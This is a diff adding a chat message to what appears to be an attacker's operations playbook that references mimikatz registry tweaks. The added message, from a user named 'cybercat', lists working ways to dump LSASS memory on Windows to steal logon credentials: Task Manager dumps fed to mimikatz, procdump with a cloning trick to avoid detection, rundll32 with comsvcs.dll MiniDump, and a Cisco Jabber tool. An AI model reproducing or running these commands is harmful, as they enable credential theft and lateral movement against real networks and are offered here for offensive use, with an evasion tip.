@@ -1407,3 +1407,29 @@ All commands will be executed depending on the context/privilege (user or system
 ##WIN2012MIMIKATZ
 Adds a key to the registry for mimikatz to work.
 
+======================================
+
+Date: 2021-03-18T18:20:58.527Z
+From: cybercat
+Message: for dumping lsas it is legitimate (cleaner facial expressions for sure) you can also do this:
+```
+Dumping Lsass without mimikatz
+	2.Task manager
+		2.1. Create a minidump of the lsass.exe using task manager (must be running as administrator): open Task manager by Administrator
+		2.2. find lsass.exe
+		2.3. right click on lsass.exe
+		2.4. choose Create Dump File (you will see path to dump, fe it is "C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP")
+			[2.5. switch to mimikatz
+							> sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
+							> securlsa::logonpasswords]
+	-
+	3.Procdump
+		3.1. cmd.exe > procdump.exe -accepteula -ma lsass.exe lsass.dmp
+		// or avoid reading lsass by dumping a cloned lsass process
+			cmd.exe > procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
+	-
+	4.comsvcs.dll
+		4.1. .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+	-
+	??five. ProcessDump.exe from Cisco Jabber
+```
